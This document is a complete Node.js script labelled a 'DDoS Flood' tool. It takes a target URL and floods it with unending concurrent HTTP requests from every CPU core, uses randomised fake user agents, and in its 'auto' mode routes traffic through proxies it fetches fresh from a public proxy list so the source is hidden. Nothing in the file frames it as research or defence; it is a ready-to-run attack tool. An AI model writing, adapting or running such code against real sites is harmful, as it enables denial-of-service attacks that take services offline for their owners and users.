const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');
const HttpsProxyAgent = require('https-proxy-agent');
const os = require('os');

// Constants
const NUM_CPUS = os.cpus().length;
const REQUEST_TIMEOUT = 5000;
const PROXY_BATCH_SIZE = 1000;
const CONCURRENT_REQUESTS = 100;

// Global variables
let proxies = [];
let targetUrl = '';
let mode = '';

async function loadProxies() {
  try {
    const proxyResponse = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', {
      timeout: 10000
    });
    
    return proxyResponse.data.replace(/\r/g, '').split('\n').filter(Boolean);
  } catch (error) {
    console.error('Failed to fetch proxies, retrying...');
    return [];
  }
}

function getRandomProxy() {
  return proxies[Math.floor(Math.random() * proxies.length)];
}

async function makeRequest(useProxy = false) {
  const config = {
    url: targetUrl,
    method: 'get',
    timeout: REQUEST_TIMEOUT,
    headers: {
      'Cache-Control': 'no-cache',
      'User-Agent': fakeUa(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
      'Connection': 'keep-alive',
      'Upgrade-Insecure-Requests': '1'
    }
  };

  if (useProxy && proxies.length > 0) {
    const proxy = getRandomProxy();
    config.httpsAgent = new HttpsProxyAgent('http://' + proxy);
    config.proxy = false; // Disable axios default proxy handling
  }

  try {
    const response = await axios(config);
    console.log(`Attack ${useProxy ? 'proxy' : 'raw'}: ${response.status}`);
    return true;
  } catch (error) {
    if (error.response) {
      console.log(`Attack ${useProxy ? 'proxy' : 'raw'}: ${error.response.status}`);
      return true;
    }
    return false;
  }
}

async function executeAttack() {
  const useProxy = mode === 'auto';
  
  // Create a pool of concurrent requests
  const requests = [];
  for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
    requests.push(makeRequest(useProxy));
  }
  
  await Promise.allSettled(requests);
  
  // Immediately schedule the next batch
  setImmediate(executeAttack);
}

async function refreshProxies() {
  if (mode === 'auto') {
    const newProxies = await loadProxies();
    if (newProxies.length > 0) {
      proxies = newProxies;
      console.log(`Refreshed proxy list: ${proxies.length} proxies loaded`);
    }
    
    // Schedule the next refresh
    setTimeout(refreshProxies, 60000); // Refresh every minute
  }
}

async function initialize() {
  console.log('╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗  ╔╗ ╦ ╦╔═╗╔═╗╔═╗╔═╗');
  console.log('╚═╗║ ║║  ╠╩╗║╣  ║   ╠╩╗╚╦╝╠═╝╠═╣╚═╗╚═╗');
  console.log('╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩   ╚═╝ ╩ ╩  ╩ ╩╚═╝╚═╝');
  console.log('> DDoS Flood : Optimized Version <');
  
  if (process.argv.length !== 4) {
    console.log('Usage : node flood.js [url] [auto/off]');
    process.exit(1);
  }
  
  targetUrl = process.argv[2];
  mode = process.argv[3].toLowerCase();
  
  if (mode !== 'auto' && mode !== 'off') {
    console.log('Mode must be either "auto" or "off"');
    process.exit(1);
  }
  
  if (mode === 'auto') {
    console.log('Loading proxies...');
    proxies = await loadProxies();
    console.log(`Loaded ${proxies.length} proxies`);
    
    if (proxies.length === 0) {
      console.log('No proxies available. Switching to raw mode.');
      mode = 'off';
    } else {
      // Start proxy refreshing process
      refreshProxies();
    }
  }
  
  console.log(`Starting attack on ${targetUrl} in ${mode} mode`);
  console.log(`Using ${NUM_CPUS} CPU cores`);
  
  if (cluster.isMaster) {
    // Fork workers based on CPU count
    for (let i = 0; i < NUM_CPUS; i++) {
      cluster.fork();
      console.log(`WORKER ${i + 1} STARTED`);
    }
    
    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died. Restarting...`);
      cluster.fork();
    });
  } else {
    // Workers execute the attack
    executeAttack();
  }
}

// Handle errors globally
process.on('uncaughtException', (err) => {
  // Log critical errors only
  if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT') {
    return;
  }
  console.error('Uncaught exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
  // Ignore common network errors
  if (reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') {
    return;
  }
  console.error('Unhandled rejection:', reason);
});

// Start the application
initialize();
